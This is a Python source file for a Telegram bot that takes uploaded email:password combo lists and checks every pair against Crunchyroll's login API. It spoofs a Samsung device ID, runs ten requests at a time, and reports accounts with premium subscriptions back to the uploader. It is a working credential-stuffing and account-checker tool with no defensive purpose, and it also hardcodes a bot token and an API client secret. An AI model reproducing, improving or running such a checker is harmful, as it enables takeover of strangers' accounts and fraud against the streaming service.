import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import aiohttp
import asyncio
import uuid
import urllib.parse
import threading

# Initialize the bot with your token
bot_token = "6743674131:AAFxWzfagkFlNUCM5uzRuaoj4mBmrmOotYs"
bot = telebot.TeleBot(bot_token)

# Headers and API details for Crunchyroll
api_url = "https://beta-api.crunchyroll.com/auth/v1/token"
headers = {
    'authorization': 'Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=',
    'content-type': 'application/x-www-form-urlencoded; charset=utf-8',
    'accept-encoding': 'gzip',
}

# Country codes dictionary (Add more as needed)
country_codes = {
    "AF": "Afghanistan 🇦🇫", "AX": "Åland Islands 🇦🇽", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
    # ... (rest of the country codes)
}

# Dictionary to track ongoing processes
user_processing_state = {}
loop = asyncio.get_event_loop()

# Global aiohttp session for reuse
session = aiohttp.ClientSession()

# Function to Check Single Email:Password (Asynchronous)
async def check_account(email, password):
    guid = str(uuid.uuid4())  # Generate unique device ID
    encoded_email = urllib.parse.quote_plus(email)
    encoded_password = urllib.parse.quote_plus(password)

    # Prepare request body
    data = f"username={encoded_email}&password={encoded_password}&grant_type=password&scope=offline_access&device_id={guid}&device_name=SM-G988N&device_type=samsung%20SM-G977N"

    try:
        async with session.post(api_url, data=data, headers=headers) as response:
            if response.status == 401:
                return "bad"  # Login failed

            json_response = await response.json()
            access_token = json_response.get("access_token")
            account_id = json_response.get("account_id")
            if not access_token or not account_id:
                return "bad"

            # Check subscription details
            account_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
            account_headers = {
                'authorization': f"Bearer {access_token}",
                'accept-encoding': 'gzip',
            }
            async with session.get(account_url, headers=account_headers) as account_response:
                account_data = await account_response.json()

                # Get subscription country
                subscription_country = account_data.get("subscription_country", "Unknown")
                country_name = country_codes.get(subscription_country, "Unknown Country")

                if "subscription.not_found" in await account_response.text():
                    return "bad"  # Not a premium account

                return f"✅ *Premium Account Found!*\n- *Combo*: `{email}:{password}`\n"
    except Exception:
        return "bad"

# Limit concurrency to avoid overwhelming the API
semaphore = asyncio.Semaphore(10)

async def process_pair(user_id, email, password, sent_message, counters):
    async with semaphore:
        if not user_processing_state.get(user_id, False):
            return
        try:
            result = await check_account(email, password)
            if result == "bad":
                counters["bad"] += 1
            else:
                counters["premium"] += 1
                bot.send_message(user_id, result, parse_mode="Markdown")

            # Update Inline Keyboard
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton(f"Total: {counters['total']}", callback_data="total"),
                InlineKeyboardButton(f"Premium: {counters['premium']}", callback_data="premium"),
                InlineKeyboardButton(f"Bad: {counters['bad']}", callback_data="bad"),
                InlineKeyboardButton("🛑 Stop", callback_data="stop"),
            )
            bot.edit_message_reply_markup(
                chat_id=user_id,
                message_id=sent_message.message_id,
                reply_markup=markup,
            )
        except Exception as e:
            print(f"Error: {e}")  # Log errors for debugging

# Mass Check Command
@bot.message_handler(commands=["mass"])
def handle_mass_check_prompt(message):
    bot.reply_to(message, "Please upload a `.txt` file with email:password pairs, one per line.")

@bot.message_handler(content_types=["document"])
def handle_file_upload(message):
    try:
        # Download the uploaded file
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        # Decode and split file content
        content = downloaded_file.decode("utf-8")
        pairs = [line.strip() for line in content.splitlines() if line.strip()]

        user_id = message.chat.id
        total_accounts = len(pairs)

        # Initialize processing state
        user_processing_state[user_id] = True

        # Initialize Inline Keyboard with Stop Button
        counters = {"total": total_accounts, "premium": 0, "bad": 0}
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton(f"Total: {total_accounts}", callback_data="total"),
            InlineKeyboardButton(f"Premium: 0", callback_data="premium"),
            InlineKeyboardButton(f"Bad: 0", callback_data="bad"),
            InlineKeyboardButton("🛑 Stop", callback_data="stop"),
        )
        sent_message = bot.send_message(message.chat.id, "🔄 Processing accounts...", reply_markup=markup)

        # Start processing
        asyncio.run(run_mass_check(user_id, pairs, sent_message, counters))

    except Exception as e:
        bot.send_message(message.chat.id, f"Error processing file: {str(e)}", parse_mode="Markdown")

async def run_mass_check(user_id, pairs, sent_message, counters):
    tasks = [process_pair(user_id, *pair.split(":"), sent_message, counters) for pair in pairs if ":" in pair]
    await asyncio.gather(*tasks)

    if user_processing_state.get(user_id, False):
        bot.send_message(user_id, "✅ Bulk checking completed.")
    else:
        bot.send_message(user_id, "🛑 Process stopped by user.")
    user_processing_state.pop(user_id, None)

# Cleanly close session on exit
def cleanup():
    loop.run_until_complete(session.close())
    loop.close()

import atexit
atexit.register(cleanup)

# Run Bot Polling
bot.polling()
